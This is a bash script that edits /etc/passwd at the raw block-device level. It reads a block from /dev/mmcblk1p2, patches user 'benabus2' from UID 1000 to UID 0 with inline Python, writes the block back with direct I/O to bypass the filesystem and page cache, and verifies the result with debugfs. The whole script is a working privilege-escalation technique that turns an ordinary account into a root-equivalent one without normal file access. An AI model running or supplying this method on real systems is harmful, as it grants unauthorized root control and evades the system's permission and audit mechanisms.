#!/bin/bash
set -e
export LC_ALL=C
DEV=/dev/mmcblk1p2
BLK=1160616
cd /tmp/rawedit
dd if=$DEV of=rawblock.bin bs=4096 skip=$BLK count=1 status=none
OFF=$(python3 -c "
b=open('/tmp/rawedit/rawblock.bin','rb').read()
i=b.find(b'benabus2:x:')
print(i if i>=0 else -1)")
echo "substring offset inside block: $OFF"
[ "$OFF" -ge 0 ] || exit 1
python3 - <<PY
b = bytearray(open('/tmp/rawedit/rawblock.bin','rb').read())
o = $OFF
line_start = b.index(b'benabus2:x:', o)
# patch uid digits: find ':x:' then replace next 4 chars
idx = line_start + len(b'benabus2:x')
assert b[idx:idx+5] == b':1000', b[idx:idx+5]
b[idx+1:idx+5] = b'0000'
open('/tmp/rawedit/rawblock.new','wb').write(bytes(b))
print("block patched")
PY
dd if=rawblock.new of=$DEV bs=4096 seek=$BLK count=1 conv=notrunc iflag=direct oflag=direct status=none
sync
echo "== verify from disk (debugfs view bypasses page cache) =="
debugfs -R "dump /etc/passwd /tmp/rawedit/passwd.verify" $DEV 2>/dev/null
grep benabus2 /tmp/rawedit/passwd.verify
